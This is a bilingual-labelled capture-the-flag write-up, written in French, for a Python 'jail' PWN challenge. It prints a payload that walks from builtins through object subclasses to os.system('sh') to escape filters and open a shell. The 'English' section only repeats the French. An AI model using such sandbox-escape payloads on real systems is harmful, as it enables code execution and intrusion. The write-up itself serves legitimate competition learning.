#### Categorie: PWN
#### **Author**: 5c0r7
#### Solve: 15/20 
#### Points: 500 pts (at first)| 360 pts (at end)

#### Write-up by:[0xJekyll](https://twitter.com/Ted_Kouhouenou) 

### Description : 
#### **[FR]**
Un autre jail, échappe les filtres.
#### **[EN]**
Another jail, bypass the filters.

`nc 54.37.70.250 1004`


## Solution :
### Fr Version : 

`For ENG version scroll down` 

![prison](Images/gankpame2.png)

Ce chall fait reference au Chall du Qualification Stage des qualification du HackerLab 2023
[gankpame](https://github.com/Tednoob17/HackerLab2023/blob/main/Qualifications%20Stages/HackerLab2023%20-%20Gankpa%20M%C9%9B.pdf)  <- (Le writeup)


Comme lors de la premiere parie de ce chall nous avions utiliser un payload python 
et aussi come lors de la premiere partie nous avions des restrictions sur le payload a utiliser lui meme comme la longueur de la chaine a utiliser ainsi que des fonctions interdites,ici nous avons des filtres et la restrictions de la taille du payload est toujours aussi presente.

```python3
__builtins__['a']=__builtins__
a['b']=().__class.bases__
a['c']=b[0].__subclasses__()
a['d']=c[59].__init__
a['e']=d.__getattribute__
a['f']=e("func_globals")
a['g']=f['LINECACHE'.lower()]
a['h']=g.__dict__
a['i']=h['OS'.lower()]
a['j']=i.__dict__ 
j['SYSTEM'.lower()]('sh')
```
ce payload nous permet de reduite la taille en faisant des affectations continue de la chaine du payload precedent en demarrant par les *builtins* la premiere classe de base et en descendant vers les sous classes afin d'obtenir une fonction pouvant nous aider a avoir un shell pour pouvoir aficher le flag qui ici est un fichier cacher . 


------------------------------------------------------------------------
### Eng Version 


![prison](Images/gankpame2.png)

Ce chall fait reference au Chall du Qualification Stage des qualification du HackerLab 2023
[gankpame](https://github.com/Tednoob17/HackerLab2023/blob/main/Qualifications%20Stages/HackerLab2023%20-%20Gankpa%20M%C9%9B.pdf)  <- (Le writeup)


Comme lors de la premiere parie de ce chall nous avions utiliser un payload python 
et aussi come lors de la premiere partie nous avions des restrictions sur le payload a utiliser lui meme comme la longueur de la chaine a utiliser ainsi que des fonctions interdites,ici nous avons des filtres et la restrictions de la taille du payload est toujours aussi presente.

```python3
__builtins__['a']=__builtins__
a['b']=().__class.bases__
a['c']=b[0].__subclasses__()
a['d']=c[59].__init__
a['e']=d.__getattribute__
a['f']=e("func_globals")
a['g']=f['LINECACHE'.lower()]
a['h']=g.__dict__
a['i']=h['OS'.lower()]
a['j']=i.__dict__ 
j['SYSTEM'.lower()]('sh')
```
ce payload nous permet de reduite la taille en faisant des affectations continue de la chaine du payload precedent en demarrant par les *builtins* la premiere classe de base et en descendant vers les sous classes afin d'obtenir une fonction pouvant nous aider a avoir un shell pour pouvoir aficher le flag qui ici est un fichier cacher . 

